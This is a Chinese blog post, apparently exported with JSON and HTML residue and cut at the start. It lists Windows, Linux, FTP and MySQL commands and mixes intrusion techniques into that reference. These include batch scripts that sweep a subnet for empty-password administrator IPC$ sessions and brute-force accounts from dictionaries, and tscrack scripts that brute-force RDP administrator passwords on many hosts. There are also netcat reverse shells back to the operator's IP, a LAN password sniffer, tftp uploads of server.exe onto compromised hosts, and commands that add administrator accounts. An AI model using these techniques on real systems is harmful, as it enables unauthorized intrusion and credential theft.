98)查看本地ip地址，ipconfig可用参数\"/all\"显示全部配置信息 \ntlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) \nkill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) \ndel -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如\"DEL/AR *.*\"表示删除当前目录下所有只读文件，\"DEL/A-S *.*\"表示删除当前目录下除系统文件以外的所有文件\n#2 二：\ndel /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同） \nmove 盘符\\路径\\要移动的文件名　存放移动文件的路径\\移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖 \nfc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，\"> \"和\"> >\" 是重定向命令 \nat id号 开启已注册的某个计划任务 \nat /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止 \nat id号 /delete 停止某个已注册的计划任务 \nat 查看所有的计划任务 \nat \\\\ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机 \nfinger username @host 查看最近有哪些用户登陆 \ntelnet ip 端口 远和登陆服务器,默认端口为23 \nopen ip 连接到IP（属telnet登陆后的命令） \ntelnet 在本机上直接键入telnet 将进入本机的telnet \ncopy 路径\\文件名1　路径\\文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件 \ncopy c:\\srv.exe \\\\ip\\admin$ 复制本地c:\\srv.exe到对方的admin下 \ncppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件\nver 在DOS窗口下显示版本信息 \nwinver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名） \nformat 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS \nmd　目录名 创建目录 \nreplace 源文件　要替换文件的目录 替换文件 \nren 原文件名　新文件名 重命名文件名 \ntree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称 \ntype 文件名 显示文本文件的内容 \nmore 文件名 逐屏显示输出文件 \ndoskey 要锁定的命令＝字符\ndoskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir= \ntaskmgr 调出任务管理器 \nchkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误 \ntlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口 \nexit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe \npath 路径\\可执行文件的文件名 为可执行文件设置一个路径。 \ncmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /? \nregedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示； \nregedit /e 注册表文件名 导出注册表 \ncacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D:\\test.txt /D pub 设定d:\\test.txt拒绝pub用户访问。 \ncacls 文件名 查看文件的访问用户权限列表 \nREM 文本内容 在批处理文件中添加注解 \nnetsh 查看或更改本地网络配置情况\n#4 四：\nIIS服务命令： \niisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现） \niisreset /start或stop 启动（停止）所有Internet服务 \niisreset /restart 停止然后重新启动所有Internet服务 \niisreset /status 显示所有Internet服务状态 \niisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动 \niisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机 \niisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务 \niisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。 \nFTP 命令： (后面有详细说明内容) \nftp的命令行格式为:\nftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。\n－d 使用调试方式。 \n－n 限制ftp的自动登录,即不使用.netrc文件。\n－g 取消全局文件名。 \nhelp [命令] 或 ？[命令] 查看命令说明 \nbye 或 quit 终止主机FTP进程,并退出FTP管理方式. \npwd 列出当前远端主机目录 \nput 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中 \nget 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中 \nmget [remote-files] 从远端主机接收一批文件至本地主机 \nmput local-files 将本地主机中一批文件传送至远端主机 \ndir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件 \nascii 设定以ASCII方式传送文件(缺省值) \nbin 或 image 设定以二进制方式传送值) \nbin 或 image 设定以二进制方式传送文件 \nbell 每完成一次文件传送,报警提示 \ncdup 返回上一级目录 \nclose 中断与远程服务器的ftp会话(与open对应) \nopen host[port] 建立指定ftp服务器连接,可指定连接端口 \ndelete 删除远端主机中的文件 \nmdelete [remote-files] 删除一批文件 \nmkdir directory-name 在远端主机中建立目录 \nrename [from] [to] 改变远端主机中的文件名 \nrmdir directory-name 删除远端主机中的目录 \nstatus 显示当前FTP的状态 \nsystem 显示远端主机系统类型 \nuser user-name [password] [account] 重新以别的用户名登录远端主机 \nopen host [port] 重新建立一个新的连接 \nprompt 交互提示模式 \nmacdef 定义宏命令 \nlcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录 \nchmod 改变远端主机的文件权限 \ncase 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母 \ncd remote－dir 进入远程主机目录 \ncdup 进入远程主机目录的父目录 \n! 在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip \nMYSQL 命令： \nmysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。\n（例：mysql -h110.110.110.110 -Uroot -P123456 \n注:u与root可以不用加空格，其它也一样） \nexit 退出MYSQL \nmysqladmin -u用户名 -p旧密码 password 新密码 修改密码 \ngrant select on 数据库.* to 用户名@登录主机 identified by \\\"密码\\\"; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符） \nshow databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。 \nuse mysql；\nshow tables; 显示库中的数据表 \ndescribe 表名; 显示数据表的结构 \ncreate database 库名; 建库 \nuse 库名；\ncreate table 表名 (字段设定列表)； 建表 \ndrop database 库名; \ndrop table 表名； 删库和删表 \ndelete from 表名; 将表中记录清空 \nselect * from 表名; 显示表中的记录 \nmysqldump --opt school>school.bbb 备份数据库：（命令在DOS的\\\\mysql\\\\bin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。 \nwin2003系统下新增命令（实用部份）： \nshutdown /参数 关闭或重启本地或远程主机。\n参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。\n例：shutdown /r /t 0 立即重启本地主机（无延时） \ntaskill /参数 进程名或进程的pid 终止一个或多个任务和进程。\n参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。 \ntasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。\n参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。\n#6 六：\nLinux系统下基本命令： 要区分大小写 \nuname 显示版本信息（同win2K的 ver） \ndir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir） \npwd 查询当前所在的目录位置 \ncd cd　..回到上一层目录，注意cd 与..之间有空格。cd　/返回到根目录。 \ncat 文件名 查看文件内容 \ncat >abc.txt 往abc.txt文件中写上内容。 \nmore 文件名 以一页一页的方式显示一个文本文件。 \ncp 复制文件 \nmv 移动文件 \nrm 文件名 删除文件，rm -a 目录名删除目录及子目录 \nmkdir 目录名 建立目录 \nrmdir 删除子目录，目录内没有文档。 \nchmod 设定档案或目录的存取权限 \ngrep 在档案中查找字符串 \ndiff 档案文件比较 \nfind 档案搜寻 \ndate 现在的日期、时间 \nwho 查询目前和你使用同一台机器的人以及Login时间地点 \nw 查询目前上机者的详细资料 \nwhoami 查看自己的帐号名称 \ngroups 查看某人的Group \npasswd 更改密码 \nhistory 查看自己下过的命令 \nps 显示进程状态 \nkill 停止某进程 \ngcc 黑客通常用它来编译C语言写的文件 \nsu 权限转换为指定使用者 \ntelnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。 \nftp ftp连接上某服务器（同win2K） \n附：批处理命令与变量\n1：for命令及变量 基本格式： \nFOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。\n批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use \\\\ip\\ipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3\n(set):指定一个或一组文件，可使用通配符，如：(D:\\user.txt)和(1 1 254)(1 -1 254),{ \"(1 1 254)\"第一个\"1\"指起始值，第二个\"1\"指增长量，第三个\"254\"指结束值，即：从1到254；\"(1 -1 254)\"说明：即从254到1 }\ncommand：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：& 来隔开\ncommand_parameters：为特定命令指定参数或命令行开关\nIN (set)：指在(set)中取值；DO command ：指执行command\n参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:\\pass.txt)时 }。 \n用法举例： \n@echo off \necho 用法格式：test.bat *.*.* > test.txt \nfor /L %%G in (1 1 254) do echo %1.%%G >>test.txt & net use \\\\%1.%%G /user:administrator | find \"命令成功完成\" >>test.txt \n存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。\n/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；& 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有\"命令成功完成\"信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。 \n@echo off \necho 用法格式：ok.bat ip \nFOR /F %%i IN (D:\\user.dic) DO smb.exe %1 %%i D:\\pass.dic 200 \n存为：ok.exe 说明：输入一个IP后，用字典文件d:\\pass.dic来暴解d:\\user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。 \n2：if命令及变量 基本格式： \nIF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为\"真\"。\n例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。\n0 指发现并成功执行（真）；1 指没有发现、没执行（假）。 \nIF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。\n例：\"if \"%2%\"==\"4\" goto start\"指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加\" \"） \nIF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。\n例：\"if not nc.exe goto end\"指：如果没有发现nc.exe文件就跳到\":end\"标签处。\n\nIF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。\n当有del命令时需把del命令全部内容用< >括起来，因为del命令要单独一行时才能执行，用上< >后就等于是单独一行了；例如：\"if exist test.txt. else echo test.txt.missing \"，注意命令中的\".\"\n\n（二）系统外部命令(均需下载相关工具)：\n1、瑞士军刀：nc.exe\n参数说明： \n-h 查看帮助信息 \n-d 后台模式 \n-e prog程序重定向，一但连接就执行［危险］ \n-i secs延时的间隔 \n-l 监听模式，用于入站连接 \n-L 监听模式，连接天闭后仍然继续监听，直到CTR+C \n-n IP地址，不能用域名 \n-o film记录16进制的传输 \n-p[空格]端口 本地端口号 \n-r 随机本地及远程端口 \n-t 使用Telnet交互方式 \n-u UDP模式 \n-v 详细输出，用-vv将更详细 \n-w数字 timeout延时间隔 \n-z 将输入，输出关掉（用于扫锚时） \n基本用法： \nnc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口 \nnc -l -p 80 开启本机的TCP 80端口并监听 \nnc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口 \nnc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口 \nnc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口 \n高级用法： \nnc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止 \nnc -L -p 80 > c:\\log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:\\log.txt \nnc -L -p 80 < c:\\honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:\\honeyport.txt中内容送入管道中，亦可起到传送文件作用 \ntype.exe c:\\honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:\\honeyport.txt中内容送入管道中,亦可起到传送文件作用 \n本机上用：nc -l -p 本机端口 \n在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K\nnc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙 \n本机上用：nc -d -l -p 本机端口 < 要传送的文件路径及名称 \n在对方主机上用：nc -vv 本机IP 本机端口 > 存放文件的路径及名称 传送文件到对方主机 \n备 注： \n| 管道命令 \n< 或 > 重定向命令。\"<\"，例如：tlntadmn < test.txt 指把test.txt的内容赋值给tlntadmn命令 \n＠ 表示执行＠后面的命令，但不会显示出来（后台执行）；例：＠dir c:\\winnt >> d:\\log.txt 意思是：后台执行dir，并把结果存在d:\\log.txt中 \n>与>>的区别 　\">\"指：覆盖；\">>\"指：保存到(添加到）。\n如：@dir c:\\winnt >> d:\\log.txt和@dir c:\\winnt > d:\\log.txt二个命令分别执行二次比较看：用>>的则是把二次的结果都保存了，而用：>则只有一次的结果，是因为第二次的结果把第一次的覆盖了。\n#8 八：\n2、扫锚工具：xscan.exe\n基本格式 \nxscan -host <起始IP>[-<终止IP>] <检测项目> [其他选项] 扫锚\"起始IP到终止IP\"段的所有主机信息 \nxscan -file <主机列表文件名> <检测项目> [其他选项] 扫锚\"主机IP列表文件名\"中的所有主机信息 \n检测项目 \n-active 检测主机是否存活 \n-os 检测远程操作系统类型（通过NETBIOS和SNMP协议） \n-port 检测常用服务的端口状态 \n-ftp 检测FTP弱口令 \n-pub 检测FTP服务匿名用户写权限 \n-pop3 检测POP3-Server弱口令 \n-smtp 检测SMTP-Server漏洞 \n-sql 检测SQL-Server弱口令 \n-smb 检测NT-Server弱口令 \n-iis 检测IIS编码/解码漏洞 \n-cgi 检测CGI漏洞 \n-nasl 加载Nessus攻击脚本 \n-all 检测以上所有项目 \n其它选项 \n-i 适配器编号 设置网络适配器, <适配器编号>可通过\"-l\"参数获取 \n-l 显示所有网络适配器 \n-v 显示详细扫描进度 \n-p 跳过没有响应的主机 \n-o 跳过没有检测到开放端口的主机 \n　 -t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10 \n-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件) \n用法示例 \nxscan -host 192.168.1.1-192.168.255.255 -all -active -p　 检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机 \nxscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机 \nxscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测\"hostlist.txt\"文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机 \n3、命令行方式嗅探器: xsniff.exe\n可捕获局域网内FTP/SMTP/POP3/HTTP协议密码\n参数说明 \n-tcp 输出TCP数据报 \n-udp 输出UDP数据报 \n-icmp 输出ICMP数据报 \n-pass 过滤密码信息 \n-hide 后台运行 \n-host 解析主机名 \n-addr IP地址 过滤IP地址 \n-port 端口 过滤端口 \n-log 文件名 将输出保存到文件 \n-asc 以ASCII形式输出 \n-hex 以16进制形式输出 \n用法示例 \nxsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中 \nxsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出 \n4、终端服务密码破解: tscrack.exe\n参数说明 \n-h 显示使用帮助 \n-v 显示版本信息 \n-s 在屏幕上打出解密能力 \n-b 密码错误时发出的声音 \n-t 同是发出多个连接（多线程） \n-N Prevent System Log entries on targeted server \n-U 卸载移除tscrack组件 \n-f 使用－f后面的密码 \n-F 间隔时间（频率） \n-l 使用－l后面的用户名 \n-w 使用－w后面的密码字典 \n-p 使用－p后面的密码 \n-D 登录主页面 \n用法示例 \ntscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码 \ntscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户 \n@if not exist ipcscan.txt goto noscan \n@for /f \"tokens=1 delims= \" %%i in (3389.txt) do call hack.bat %%i \nnscan \n@echo 3389.txt no find or scan faild \n(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt) \n3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat \n@if not exist tscrack.exe goto noscan \n@tscrack %1 -l administrator -w pass.dic >>rouji.txt \n:noscan \n@echo tscrack.exe no find or scan faild \n(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了) \nhack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。 \n5、其它：\nShutdown.exe \nShutdown \\\\IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。） \nfpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙） \nfpipe -l 80 -s 1029 -r 80 www.sina.com.cn 当有人扫锚你的80端口时，他扫到的结果会完全是www.sina.com.cn的主机信息 \nFpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。 \nOpenTelnet.exe (远程开启telnet工具) \nopentelnet.exe \\\\IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet \\\\ip 连接上对方。\nNTLM认证方式：０：不使用NTLM身份验证；１：先尝试NTLM身份验证，如果失败，再使用用户名和密码；２：只使用NTLM身份验证。\nResumeTelnet.exe (OpenTelnet附带的另一个工具) \nresumetelnet.exe \\\\IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。 \n6、FTP命令详解：\nFTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。\nFTP的命令行格式为： \nftp -v -d -i -n -g [主机名] ，其中\n-v 显示远程服务器的所有响应信息；\n-n 限制ftp的自动登录，即不使用；.n etrc文件；\n-d 使用调试方式；\n-g 取消全局文件名。\n\nFTP使用的内部命令如下(中括号表示可选项):\n1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls*.zip \n2.$ macro-ame[args]： 执行宏定义macro-name。\n3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。 \n4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。\n5.ascii：使用ascii类型传输方式。\n6.bell：每个命令执行完毕后计算机响铃一次。\n7.bin：使用二进制文件传输方式。\n8.bye：退出ftp会话过程。\n9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。 \n10.cd remote-dir：进入远程主机目录。\n11.cdup：进入远程主机目录的父目录。 \n12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。\n13.close：中断与远程服务器的ftp会话(与open对应)。 \n14.cr：使用asscii方式传输文件时，将回车换行转换为回行。\n15.delete remote-file：删除远程主机文件。 \n16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。\n17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。 \n18.disconnection：同close。\n19.form format：将文件传输方式设置为format，缺省为file方式。 \n20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。\n21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。 \n22.hash：每传输1024字节，显示一个hash符号(#)。\n23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。\n25.image：设置二进制传输方式(同binary)。 \n26.lcd[dir]：将本地工作目录切换至dir。\n27.ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。 \n28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。\n29.mdelete[remote-file]：删除远程主机文件。 \n30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir *.o.*.zipoutfile 。\n31.mget remote-files：传输多个远程文件。 \n32.mkdir dir-name：在远程主机中建一目录。\n33.mls remote-file local-file：同nlist，但可指定多个文件名。 \n34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。\n35.modtime file-name：显示远程主机文件的最后修改时间。 \n36.mput local-file：将多个文件传输至远程主机。\n37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。\n38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。\n39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。\n40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。\n41.open host[port]：建立指定ftp服务器连接，可指定连接端口。 \n42.passive：进入被动传输方式。\n43.prompt：设置多个文件传输时的交互提示。 \n44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。\n45.put local-file[remote-file]：将本地文件local-file传送至远程主机。 \n46.pwd：显示远程主机的当前工作目录。\n47.quit：同bye，退出ftp会话。 \n48.quote arg1，arg2...：将参数逐字发至远程ftp服务器，如：quote syst.\n49.recv remote-file[local-file]：同get。 \n50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。\n51.rhelp[cmd-name]：请求获得远程主机的帮助。 \n52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。\n53.rename[from][to]：更改远程主机文件名。 \n54.reset：清除回答队列。\n55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。 \n56.rmdir dir-name：删除远程主机目录。\n57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。 \n58.send local-file[remote-file]：同put。\n59.sendport：设置PORT命令的使用。 \n60.site arg1，arg2...：将参数作为SITE命令逐字发送至远程ftp主机。\n61.size file-name：显示远程主机文件大小，如：site idle 7200。 \n62.status：显示当前ftp状态。\n63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。 \n64.sunique：将远程主机文件名存储设置为只一(与runique对应)。\n65.system：显示远程主机的操作系统类型。 \n66.tenex：将文件传输类型设置为TENEX机的所需的类型。\n67.tick：设置传输时的字节计数器。 \n68.trace：设置包跟踪。\n69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。 \n70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3\n71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。 \n72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.\n73.?[cmd]：同help.   \n","slug":"DOS命令大全","published":1,"updated":"2017-12-29T15:28:36.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tvp000bmfahc0yc197i","content":"<p><strong>copy:</strong> \\ip\\admin$\\svv.exe c:\\ 或:copy\\ip\\admin$*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C： </p>\n<p><strong>xcopy</strong> 要复制的文件或目录树　目标地址\\目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件 </p>\n<p><strong>tftp -i</strong> 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:\\server.exe 登陆后，将”IP”的server.exe下载到目标主机c:\\server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送</p>\n<p><strong>tftp -i</strong> 对方IP　put c:\\server.exe 登陆后，上传本地c:\\server.exe至主机<br><strong>ftp ip</strong> 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；<br>默认为ASCII格式传送(文本文件时)<br><strong>route print </strong>显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface<br><strong>arp</strong> 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息<br><strong>start </strong>程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令<br><strong>mem </strong>查看cpu使用情况<br><strong>attrib </strong>文件名(目录名) 查看某文件（目录）的属性<br><strong>attrib</strong> 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性<br><strong>dir </strong>查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间<br><strong>date /t 、 time /t </strong>使用此参数即”DATE/T”、”TIME/T”将只显示当前日期和时间，而不必输入新日期和时间<br><strong>set</strong> 指定环境变量名称=要指派给变量的字符 设置环境变量<br>set 显示当前所有的环境变量<br>set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量<br>pause 暂停批处理程序，并显示出：请按任意键继续….<br>if 在批处理程序中执行条件处理（更多说明见if命令及变量）<br>goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：”：start”标签）<br>call 路径\\批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）<br>for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）<br>echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置<br>echo 信息 在屏幕上显示出信息<br>echo 信息 &gt;&gt; pass.txt 将”信息”保存到pass.txt文件中<br>findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hello<br>find 文件名 查找某文件<br>title 标题名字 更改CMD窗口标题名字<br>color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白<br>prompt 名称 更改cmd.exe的显示的命令提示符(把C:\\、D:\\统一改为：EntSky\\ )<br>net use \\ip\\ipc$ “ “ /user:” “ 建立IPC空链接<br>net use \\ip\\ipc$ “密码” /user:”用户名” 建立IPC非空链接<br>net use h: \\ip\\c$ “密码” /user:”用户名” 直接登陆后映射对方C：到本地为H:<br>net use h: \\ip\\c$ 登陆后映射对方C：到本地为H:<br>net use \\ip\\ipc$ /del 删除IPC链接<br>net use h: /del 删除映射对方到本地的为H:的映射<br>net user 用户名　密码　/add 建立用户<br>net user guest /active:yes 激活guest用户<br>net user 查看有哪些用户<br>net user 帐户名 查看帐户的属性<br>net localgroup administrators 用户名 /add 